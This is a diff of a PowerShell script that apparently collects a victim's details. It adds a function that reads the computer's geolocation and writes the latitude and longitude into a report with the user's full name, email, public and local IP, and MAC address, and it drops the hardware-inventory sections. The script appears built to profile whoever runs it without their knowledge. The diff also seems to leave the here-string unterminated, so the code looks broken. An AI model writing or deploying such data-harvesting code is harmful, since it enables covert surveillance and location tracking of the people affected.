@@ -58,26 +58,38 @@ $MAC = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*"| Select Name, MacAddress, Sta
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
-#Get System Info
-$computerSystem = Get-CimInstance CIM_ComputerSystem
+function Get-GeoLocation{
+	try {
+	Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
+	$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
+	$GeoWatcher.Start() #Begin resolving current locaton
 
-$computerName = $computerSystem.Name
+	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
+		Start-Sleep -Milliseconds 100 #Wait for discovery.
+	}  
 
-$computerModel = $computerSystem.Model
+	if ($GeoWatcher.Permission -eq 'Denied'){
+		Write-Error 'Access Denied for Location Information'
+	} else {
+		$GL = $GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevent results.
+		$GL = $GL -split " "
+		$Lat = $GL[0].Substring(11) -replace ".$"
+		$Lon = $GL[1].Substring(10) -replace ".$" 
+		return $Lat, $Lon
 
-$computerManufacturer = $computerSystem.Manufacturer
 
-$computerBIOS = Get-CimInstance CIM_BIOSElement  | Out-String
+	}
+	}
+    # Write Error is just for troubleshooting
+    catch {Write-Error "No coordinates found" 
+    return "No Coordinates found"
+    -ErrorAction SilentlyContinue
+    } 
 
-$computerOs=(Get-WMIObject win32_operatingsystem) | Select Caption, Version  | Out-String
+}
 
-$computerCpu=Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List  | Out-String
+$Lat, $Lon = Get-GeoLocation
 
-$computerMainboard=Get-WmiObject Win32_BaseBoard | Format-List  | Out-String
-
-$computerRamCapacity=Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}  | Out-String
-
-$computerRam=Get-WmiObject Win32_PhysicalMemory | select DeviceLocator, @{Name="Capacity";Expression={ "{0:N1} GB" -f ($_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table  | Out-String
 #------------------------------------------------------------------------------------------------------------------------------------
 
 $output = @"
@@ -124,6 +136,9 @@ Full Name: $fullName
 
 Email: $email
 
+Location:
+$Lat
+$Lon
 ------------------------------------------------------------------------------------------------------------------------------
 Public IP: 
 $computerPubIP
@@ -133,36 +148,7 @@ $localIP
 MAC:
 $MAC
 
-Computer Name:
-$computerName
 
-Model:
-$computerModel
-
-Manufacturer:
-$computerManufacturer
-
-BIOS:
-$computerBIOS
-
-OS:
-$computerOs
-
-CPU:
-$computerCpu
-
-Mainboard:
-$computerMainboard
-
-Ram Capacity:
-$computerRamCapacity
-
-Total installed Ram:
-$computerRam
-
-Video Card: 
-$videocard
-"@
 
 $output > $FileName
 
